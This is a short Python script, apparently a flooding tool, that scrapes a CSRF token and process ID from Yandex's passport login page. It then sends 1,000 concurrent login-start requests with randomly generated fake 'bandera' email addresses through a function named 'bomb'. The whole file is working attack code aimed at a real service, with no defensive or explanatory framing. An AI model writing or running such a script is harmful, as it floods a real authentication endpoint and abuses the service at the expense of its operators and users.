import random
import asyncio
import aiohttp
import secrets
import string

START_URL = "https://passport.yandex.by/auth"
LOGIN_URL = "https://passport.yandex.by/registration-validations/auth/multi_step/start"
HOST_LENGTH = 10
SUFFIX_LENGTH = 5

REQUEST_COUNT = 1000

CHARMAP = string.ascii_lowercase + string.digits


async def bomb(client):
    async with client.get(START_URL) as resp:
        text = await resp.text()
        index = text.find("csrf")
        csrf_token = text[index + 19:index + 73]
        index = text.find("process_uuid")
        process_uuid = text[index + 13: index + 49]
        
    # Extract CSRF_TOKEN
    host = "".join(random.choice(CHARMAP) for _ in range(HOST_LENGTH))
    suffix= "".join(random.choice(CHARMAP) for _ in range(SUFFIX_LENGTH))    
    payload = {
        "csrf_token": csrf_token,
        "login": f"bandera{suffix}@{host}.com",
        "process_uuid": process_uuid,
    }
    
    async with client.post(LOGIN_URL, data=payload) as resp:
        print(f"GOT RESPONSE - {resp.status}")


async def main():
    async with aiohttp.ClientSession() as client:
        jobs = [bomb(client) for _ in range(REQUEST_COUNT)]
        await asyncio.gather(*jobs)

asyncio.run(main())
